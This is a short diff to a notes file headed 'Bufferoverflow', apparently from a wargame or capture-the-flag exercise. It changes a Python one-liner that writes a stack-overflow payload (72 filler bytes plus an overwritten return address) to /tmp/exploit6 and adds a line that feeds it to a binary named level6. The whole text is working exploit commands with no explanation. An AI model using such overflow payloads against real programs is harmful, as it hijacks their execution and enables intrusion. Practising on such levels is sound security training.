@@ -1,3 +1,4 @@
 Bufferoverflow
 
-python -c 'print "A"*72 + "\x54\x84\x04\x08"' > /tmp/exploit
+python -c 'print "A"*72 + "\x54\x84\x04\x08"' > /tmp/exploit6
+./level6 `cat /tmp/exploit6`
